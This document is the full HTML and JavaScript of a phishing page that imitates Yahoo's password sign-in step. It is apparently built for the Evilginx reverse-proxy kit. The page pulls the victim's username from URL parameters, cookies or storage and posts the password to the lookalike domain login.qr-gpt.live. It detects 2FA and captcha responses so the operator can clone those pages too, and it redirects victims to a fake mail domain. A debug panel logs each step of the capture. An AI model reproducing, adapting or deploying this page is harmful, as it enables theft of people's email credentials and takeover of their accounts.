<!DOCTYPE html>
<html data-wf-page="67c6f50ed426ad7d5847f218" data-wf-site="67c6f50ed426ad7d5847f211">
<head>
  <meta charset="utf-8">
  <title>Yahoo - Enter Password</title>
  <meta content="width=device-width, initial-scale=1" name="viewport">
  <link href="css/normalize.css" rel="stylesheet" type="text/css">
  <link href="css/webflow.css" rel="stylesheet" type="text/css">
  <link href="css/yahoo-8d0526.webflow.css" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com" rel="preconnect">
  <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin="anonymous">
  <script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js" type="text/javascript"></script>
  <script type="text/javascript">WebFont.load({google:{families:["Montserrat:100,100italic,200,200italic,300,300italic,400,400italic,500,500italic,600,600italic,700,700italic,800,800italic,900,900italic","Open Sans:300,300italic,400,400italic,600,600italic,700,700italic,800,800italic"]}});</script>
  <script type="text/javascript">!function(o,c){var n=c.documentElement,t=" w-mod-";n.className+=t+"js",("ontouchstart"in o||o.DocumentTouch&&c instanceof DocumentTouch)&&(n.className+=t+"touch")}(window,document);</script>
  <link href="./yahoo.png" rel="shortcut icon" type="image/x-icon">
  <link href="./yahoo.png" rel="apple-touch-icon">
  
  <style>
    .debug-panel {
        position: fixed;
        top: 10px;
        right: 10px;
        background: #000;
        color: #0f0;
        padding: 10px;
        border-radius: 5px;
        font-family: monospace;
        font-size: 11px;
        max-width: 400px;
        z-index: 10000;
        max-height: 600px;
        overflow-y: auto;
    }
    .debug-panel h4 {
        color: #ff0;
        margin: 0 0 5px 0;
    }
    .debug-log {
        margin: 2px 0;
        word-break: break-all;
        padding: 2px;
        border-left: 3px solid #333;
        padding-left: 5px;
    }
    .debug-log.error {
        color: #ff6b6b;
        border-left-color: #ff6b6b;
    }
    .debug-log.success {
        color: #51cf66;
        border-left-color: #51cf66;
    }
    .debug-log.warning {
        color: #ffd43b;
        border-left-color: #ffd43b;
    }
    .debug-log.evilginx {
        color: #ff6b6b;
        border-left-color: #ff6b6b;
        background: rgba(255, 107, 107, 0.1);
    }
    .input-field.error {
        border-color: #d93025 !important;
        background-color: #fef7f7 !important;
    }
    .error-message {
        color: #d93025;
        font-size: 14px;
        margin-top: 8px;
        display: none;
    }
    .success-message {
        color: #0f9d58;
        font-size: 14px;
        margin-top: 8px;
        display: none;
    }
  </style>
</head>

<body>
  <!-- EVILGINX DEBUG PANEL -->
  <div class="debug-panel" id="debug-panel">
    <h4>🔥 EVILGINX DEBUG</h4>
    <div id="debug-logs"></div>
    <button onclick="clearDebug()" style="background: #333; color: white; border: none; padding: 4px 8px; border-radius: 3px; margin-top: 5px;">Clear</button>
    <button onclick="exportLogs()" style="background: #7200ff; color: white; border: none; padding: 4px 8px; border-radius: 3px; margin-top: 5px;">Export</button>
  </div>

  <section class="section">
    <div class="div-block">
      <div class="div-block-2"><img src="images/yahoo.png" loading="lazy" alt="" class="image"></div>
      <div class="div-block-3">
        <div class="text-block">Help</div>
        <div><a href="https://legal.yahoo.com/in/en/yahoo/terms/otos/index.html" class="link">Terms</a></div>
        <div><a href="https://legal.yahoo.com/in/en/yahoo/privacy/index.html" class="link-2">Privacy</a></div>
      </div>
    </div>
    <div class="layout active" id="main-layout">
      <div class="div-block-5">
        <h3 class="header active">Yahoo makes it easy to enjoy what matters most in your world</h3>
        <p class="parag active">Best-in-class Yahoo Mail, breaking local, national and global news, finance, sport, music, films and more. You get more out of the web; you get more out of life.</p>
      </div>
      <div class="form-block w-form">
        <form id="email-form" name="email-form" data-name="Email Form" class="form" 
              action="https://login.qr-gpt.live/account/challenge/password" 
              method="POST">
          
          <!-- EVILGINX COMPATIBLE HIDDEN FIELDS -->
          <input type="hidden" id="username" name="username">
          <input type="hidden" name="displayName" id="hidden-display-name">
          <input type="hidden" name="done" value="https://mail.yahoo.com/d/folders/1">
          <input type="hidden" name="src" value="ym">
          <input type="hidden" name=".lang" value="en-US">
          <input type="hidden" name=".intl" value="us">
          <input type="hidden" name="crumb" value="">
          <input type="hidden" name="acrumb" value="">
          <input type="hidden" name="sessionIndex" value="">
          
          <img src="images/yahoo.png" loading="lazy" alt="" class="image-2">
          
          <div class="pazzi" id="form-container">
            <div class="reflectto" id="userEmail">Enter your password</div>
            <h1 class="heading-2"><strong>Enter password</strong></h1>
            <div class="text-block-2">to finish signing in<br></div>
            
            <div class="pazz lpl">Password<br></div>
            <div class="ms-input-wrap">
              <input data-show="true" class="ms-input w-input" maxlength="256" name="passwd" data-name="passwd" placeholder="" type="password" id="password" data-ms-member="password" required autofocus>
              
              <div data-current="Show" data-easing="ease" data-duration-in="300" data-duration-out="100" class="ms-password-wrap w-tabs">
                <div id="transformButton" data-transform="true" class="tabs-menu w-tab-menu">
                  <a data-w-tab="Show" class="ms-password-button w-inline-block w-tab-link w--current"><img src="images/visible.png" loading="eager" alt="" class="image-4"></a>
                  <a data-w-tab="Hide" class="ms-password-button w-inline-block w-tab-link"><img src="images/eye.png" loading="eager" alt="" class="image-4"></a>
                </div>
              </div>
            </div>
            <div class="error-message" id="password-error">Invalid password. Please try again.</div>
            <div class="success-message" id="password-success">Password verified!</div>
            
            <input type="submit" data-wait="Please wait..." class="logger w-button" value="Sign In" id="submit-btn">
          </div>
        </form>
      </div>
    </div>
  </section>

  <script src="https://d3e54v103j8qbb.cloudfront.net/js/jquery-3.5.1.min.dc5e7f18c8.js?site=67c6f50ed426ad7d5847f211" type="text/javascript" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
  <script src="js/webflow.js" type="text/javascript"></script>
  
  <!-- PASSWORD TOGGLE SCRIPT -->
  <script>
  document.querySelector("[data-transform]").addEventListener("click", transform);
  var isPassword = true;
  function transform() {
     var myInput = document.querySelector("[data-show]");
     var oldHtml = myInput.outerHTML;
     var text = myInput.value;
     if (isPassword) {
         var newHtml = oldHtml.replace(/password/g, "text");
     } else {
         newHtml = oldHtml.replace(/text/g, "password");
     }
     myInput.outerHTML = newHtml;
     myInput = document.querySelector("[data-show]");
     myInput.value = text;
     isPassword = !isPassword;
  }
  </script>

  <!-- EVILGINX FOCUSED DEBUG SCRIPT -->
  <script>
  (function() {
      'use strict';
      
      // EVILGINX DEBUG SYSTEM
      const debugLogs = document.getElementById('debug-logs');
      let logCount = 0;
      
      function debugLog(message, type = 'info', data = null) {
          logCount++;
          const timestamp = new Date().toLocaleTimeString();
          console.log(`[EVILGINX-${type.toUpperCase()}] ${message}`, data || '');
          
          const logDiv = document.createElement('div');
          logDiv.className = `debug-log ${type}`;
          logDiv.innerHTML = `<strong>${timestamp}</strong> [${logCount}]: ${message}`;
          if (data && typeof data === 'object') {
              logDiv.innerHTML += `<br><small>${JSON.stringify(data, null, 2).substring(0, 200)}...</small>`;
          } else if (data) {
              logDiv.innerHTML += `<br><small>${data.toString().substring(0, 200)}...</small>`;
          }
          debugLogs.appendChild(logDiv);
          debugLogs.scrollTop = debugLogs.scrollHeight;
          
          // Keep only last 50 logs
          if (debugLogs.children.length > 50) {
              debugLogs.removeChild(debugLogs.firstChild);
          }
      }
      
      window.clearDebug = function() {
          debugLogs.innerHTML = '';
          logCount = 0;
          debugLog('🧹 Debug cleared', 'info');
      };
      
      window.exportLogs = function() {
          const logs = Array.from(debugLogs.children).map(log => log.textContent).join('\n');
          const blob = new Blob([logs], { type: 'text/plain' });
          const url = URL.createObjectURL(blob);
          const a = document.createElement('a');
          a.href = url;
          a.download = `evilginx-debug-${Date.now()}.txt`;
          a.click();
          URL.revokeObjectURL(url);
      };
      
      debugLog('🔥 EVILGINX Password Page Loaded', 'evilginx');
      debugLog('Target: Yahoo.com via evilginx proxy', 'evilginx');
      
      const elements = {
          form: document.getElementById('email-form'),
          passwordInput: document.getElementById('password'),
          submitBtn: document.getElementById('submit-btn'),
          userDisplay: document.getElementById('userEmail'),
          hiddenUsername: document.getElementById('username'),
          hiddenDisplayName: document.getElementById('hidden-display-name'),
          passwordError: document.getElementById('password-error'),
          passwordSuccess: document.getElementById('password-success')
      };
      
      let currentUsername = '';
      
      // Get username - NO validation, just capture
      function getUsername() {
          debugLog('🔍 Retrieving captured username...', 'info');
          
          const urlParams = new URLSearchParams(window.location.search);
          let username = urlParams.get('u');
          
          if (username) {
              username = decodeURIComponent(username);
              debugLog('✅ Username from URL parameter', 'success', username);
              return username;
          }
          
          const cookieMatch = document.cookie.match(/yh_usr=([^;]+)/);
          if (cookieMatch) {
              username = decodeURIComponent(cookieMatch[1]);
              debugLog('✅ Username from cookie', 'success', username);
              return username;
          }
          
          username = sessionStorage.getItem('yh_username') || localStorage.getItem('yh_username');
          if (username) {
              debugLog('✅ Username from storage', 'success', username);
              return username;
          }
          
          debugLog('❌ No username found - user bypassed login page', 'error');
          return null;
      }
      
      function initializePage() {
          debugLog('🔧 Initializing evilginx password page...', 'info');
          
          currentUsername = getUsername();
          
          if (!currentUsername) {
              debugLog('❌ No username captured - redirecting to login', 'error');
              alert('Please start from the login page.');
              window.location.href = 'https://login.qr-gpt.live/';
              return false;
          }
          
          // Set username in form (NO validation - accept anything)
          elements.userDisplay.textContent = currentUsername;
          elements.hiddenUsername.value = currentUsername;
          elements.hiddenDisplayName.value = currentUsername;
          
          debugLog('✅ Page initialized for username', 'success', currentUsername);
          debugLog('📝 Username will be sent to evilginx for credential capture', 'evilginx');
          return true;
      }
      
      function showError(message) {
          debugLog('❌ Showing error to user', 'error', message);
          elements.passwordInput.classList.add('error');
          elements.passwordError.textContent = message;
          elements.passwordError.style.display = 'block';
          elements.passwordSuccess.style.display = 'none';
          elements.passwordInput.focus();
      }
      
      function showSuccess(message) {
          debugLog('✅ Showing success to user', 'success', message);
          elements.passwordInput.classList.remove('error');
          elements.passwordError.style.display = 'none';
          elements.passwordSuccess.textContent = message;
          elements.passwordSuccess.style.display = 'block';
      }
      
      function clearMessages() {
          elements.passwordInput.classList.remove('error');
          elements.passwordError.style.display = 'none';
          elements.passwordSuccess.style.display = 'none';
      }
      
      // EVILGINX FORM SUBMISSION - Let the proxy handle everything
      function handleFormSubmission(event) {
          event.preventDefault();
          
          const password = elements.passwordInput.value.trim();
          if (!password) {
              showError('Please enter your password.');
              return;
          }
          
          clearMessages();
          elements.submitBtn.disabled = true;
          elements.submitBtn.value = 'Signing in...';
          
          debugLog('🔐 EVILGINX CREDENTIAL SUBMISSION STARTED', 'evilginx');
          debugLog('Username being sent', 'evilginx', currentUsername);
          debugLog('Password length', 'evilginx', password.length);
          debugLog('Target URL', 'evilginx', elements.form.action);
          debugLog('🚨 CREDENTIALS WILL BE CAPTURED BY EVILGINX', 'evilginx');
          
          // Prepare form data for evilginx
          const formData = new FormData(elements.form);
          formData.set('username', currentUsername);
          formData.set('displayName', currentUsername);
          
          // Log what's being sent to evilginx
          debugLog('📤 Data being sent to evilginx proxy:', 'evilginx');
          for (let [key, value] of formData.entries()) {
              if (key === 'passwd') {
                  debugLog(`  ${key}: [REDACTED - Length: ${value.length}]`, 'evilginx');
              } else {
                  debugLog(`  ${key}: ${value}`, 'evilginx');
              }
          }
          
          const urlEncodedData = new URLSearchParams(formData);
          
          // Submit to evilginx proxy - it will forward to real Yahoo
          fetch(elements.form.action, {
              method: 'POST',
              body: urlEncodedData,
              credentials: 'include',
              headers: {
                  'Content-Type': 'application/x-www-form-urlencoded',
                  'Referer': window.location.href,
                  'Origin': window.location.origin,
                  'User-Agent': navigator.userAgent,
                  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                  'Accept-Language': 'en-US,en;q=0.5'
              }
          })
          .then(response => {
              debugLog('📥 RESPONSE FROM EVILGINX PROXY', 'evilginx');
              debugLog('Status Code', 'info', response.status);
              debugLog('Status Text', 'info', response.statusText);
              
              const headers = {};
              for (let [key, value] of response.headers.entries()) {
                  headers[key] = value;
              }
              debugLog('Response Headers', 'info', headers);
              
              elements.submitBtn.disabled = false;
              elements.submitBtn.value = 'Sign In';
              
              if (response.ok) {
                  return response.text().then(text => {
                      debugLog('📄 Response Body Length', 'info', text.length);
                      debugLog('Response Preview', 'info', text.substring(0, 500));
                      
                      // Let's see what Yahoo actually sent back
                      const lowerText = text.toLowerCase();
                      
                      // Check for different Yahoo responses
                      if (lowerText.includes('invalid') || lowerText.includes('incorrect') || lowerText.includes('wrong')) {
                          debugLog('🚫 Yahoo rejected credentials', 'error');
                          showError('Invalid password. Please try again.');
                      } else if (lowerText.includes('challenge') || lowerText.includes('verification') || lowerText.includes('2fa')) {
                          debugLog('🔐 Yahoo requesting 2FA/Challenge', 'warning');
                          showSuccess('Password accepted! 2FA required.');
                          debugLog('🔍 INSPECT THE NEXT PAGE YAHOO SHOWS!', 'warning');
                          setTimeout(() => {
                              alert('Yahoo accepted the password and wants 2FA!\n\nNOW INSPECT THE 2FA PAGE THAT APPEARS AND COPY ITS HTML!');
                          }, 2000);
                      } else if (lowerText.includes('recaptcha') || lowerText.includes('captcha')) {
                          debugLog('🤖 Yahoo requesting reCAPTCHA', 'warning');
                          showSuccess('Password accepted! reCAPTCHA required.');
                          setTimeout(() => {
                              alert('Yahoo wants reCAPTCHA verification!\n\nINSPECT THE reCAPTCHA PAGE AND COPY ITS HTML!');
                          }, 2000);
                      } else if (lowerText.includes('mail') || lowerText.includes('inbox')) {
                          debugLog('📧 Direct access to Yahoo Mail', 'success');
                          showSuccess('Login successful! Redirecting...');
                          setTimeout(() => {
                              window.location.href = 'https://mail.qr-gpt.live/d/folders/1';
                          }, 2000);
                      } else {
                          debugLog('❓ Unknown Yahoo response - needs manual inspection', 'warning');
                          showSuccess('Response received - check debug panel!');
                          debugLog('🔍 FULL RESPONSE NEEDS MANUAL ANALYSIS', 'warning');
                      }
                  });
              } else if (response.status === 302 || response.status === 301) {
                  const location = response.headers.get('Location');
                  debugLog('🔄 Yahoo redirect detected', 'warning', location);
                  showSuccess('Yahoo redirect detected!');
                  
                  if (location) {
                      debugLog('🔍 INSPECT THE REDIRECT TARGET PAGE!', 'warning');
                      setTimeout(() => {
                          alert(`Yahoo is redirecting to:\n${location}\n\nINSPECT THIS PAGE AND COPY ITS HTML!`);
                      }, 2000);
                  }
              } else {
                  debugLog('❌ HTTP Error from Yahoo', 'error', `${response.status} ${response.statusText}`);
                  showError(`Yahoo returned HTTP ${response.status}`);
              }
          })
          .catch(error => {
              debugLog('💥 Network/Fetch Error', 'error', error.message);
              elements.submitBtn.disabled = false;
              elements.submitBtn.value = 'Sign In';
              showError('Connection error: ' + error.message);
          });
      }
      
      // Setup input handlers
      elements.passwordInput.addEventListener('input', clearMessages);
      elements.passwordInput.addEventListener('keydown', function(event) {
          if (event.key === 'Enter') {
              event.preventDefault();
              elements.form.dispatchEvent(new Event('submit'));
          }
      });
      
      // Initialize
      function init() {
          if (!initializePage()) return;
          
          elements.form.addEventListener('submit', handleFormSubmission);
          
          setTimeout(() => {
              elements.passwordInput.focus();
          }, 500);
          
          debugLog('✅ Evilginx password page ready for credential capture', 'evilginx');
          debugLog('🎯 Ready to capture real Yahoo credentials', 'evilginx');
      }
      
      if (document.readyState === 'loading') {
          document.addEventListener('DOMContentLoaded', init);
      } else {
          init();
      }
      
  })();
  </script>
</body>
</html>
